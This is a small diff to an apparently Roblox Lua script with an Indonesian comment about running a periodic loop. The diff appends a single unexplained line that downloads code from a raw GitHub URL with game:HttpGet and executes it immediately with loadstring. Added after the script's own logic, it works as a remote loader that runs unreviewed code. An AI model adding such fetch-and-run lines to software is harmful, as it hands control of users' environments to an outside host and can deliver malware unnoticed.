@@ -78,3 +78,5 @@ end)
 
 -- jalankan loop berkala
 startLoop()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gato290/Script/refs/heads/main/ha"))()
